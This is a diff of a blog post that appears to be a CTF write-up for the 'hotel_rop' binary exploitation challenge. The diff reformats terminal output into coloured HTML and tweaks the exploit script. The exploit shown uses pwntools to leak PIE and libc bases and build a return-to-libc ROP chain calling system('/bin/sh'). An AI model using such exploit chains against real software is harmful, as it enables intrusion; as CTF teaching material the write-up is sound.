@@ -28,15 +28,16 @@ For this challenge, we are provided with a binary and nothing else.
 
 We quickly check the security features of the binary with `pwn checksec hotel_rop` which returns
 
-```
-[*] '/media/sf_dabian/Challenges/dctf/pwn/hotel_rop'
-
+{{< rawhtml >}}
+<pre>
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] &apos;/media/sf_dabian/Challenges/dctf/pwn/hotel_rop&apos;
     Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-```
+    RELRO:    <span style="color:#cdcd00;">Partial RELRO</span>
+    Stack:    <span style="color:#cd0000;">No canary found</span>
+    NX:       <span style="color:#00cd00;">NX enabled</span>
+    PIE:      <span style="color:#00cd00;">PIE enabled</span>
+</pre>
+{{< /rawhtml >}}
 
 As shown, `PIE` and `NX` is enabled. Let's run the binary and check out what we are dealing with
 
@@ -107,11 +108,14 @@ log.info(f'pie base @ {hex(elf.address)}')
 
 OUTPUT:
 
-```
-[x] Starting local process './hotel_rop'
-[+] Starting local process './hotel_rop': pid 4990
-[*] pie base @ 0x55d2a5162000
-```
+{{< rawhtml >}}
+<pre>
+[<span style="color:#cd00cd;">x</span>] Starting local process &apos;./hotel_rop&apos;
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19494
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19494)
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] pie base &#64; 0x562e0d3bf000
+</pre>
+{{< /rawhtml >}}
 
 Running the script, we see that we successfully found PIE base.
 
@@ -133,7 +137,7 @@ Let's write our `rop.chain()`, but without having to find any gadgets or address
 rop1 = ROP(elf)
 rop1.puts(elf.got.puts)
 rop1.main()
-
+log.info(rop1.dump())
 # send rop chain with auto 40 bytes cyclic padding
 p.sendline(flat({ 40: rop1.chain()}))
 p.recvuntil(b'often.\n')
@@ -149,19 +153,23 @@ log.success(f'libc base @ {hex(libc.address)}')
 
 OUTPUT:
 
-```
-[x] Starting local process './hotel_rop'
-[+] Starting local process './hotel_rop': pid 4996
+{{< rawhtml >}}
+<pre>
 
-[*] pie base @ 0x55df8c8ff000
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19878
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] pie base &#64; 0x562942b04000
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Loaded 14 cached gadgets for &apos;hotel_rop&apos;
 
-[*] 0x0000:   0x55df8c90040b pop rdi; ret
-    0x0008:   0x55df8c903018 [arg0] rdi = got.puts
-    0x0010:   0x55df8c900030 puts
-    0x0018:   0x55df8c90036d main()
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] 0x0000:   0x562942b0540b pop rdi; ret
+    0x0008:   0x562942b08018 [arg0] rdi = got.puts
+    0x0010:   0x562942b05030 puts
+    0x0018:   0x562942b0536d main()
 
-[+] libc base @ 0x7f72197ca000
-```
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] libc base &#64; 0x7f9950b69000
+[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19878)
+
+</pre>
+{{< /rawhtml >}}
 
 Success! Let's proceed with the last part of our exploit.
 
@@ -174,7 +182,7 @@ Now we have all the pieces we need to return to libc. This is super simple with 
 binsh = next(libc.search(b'/bin/sh'))
 
 #: POP SHELL
-rop2 = ROP([libc, elf]) 
+rop2 = ROP([libc, elf])
 rop2.system(binsh)
 p.sendline(flat({40: rop2.chain()}))
 log.success(f'Enjoy your shell!')
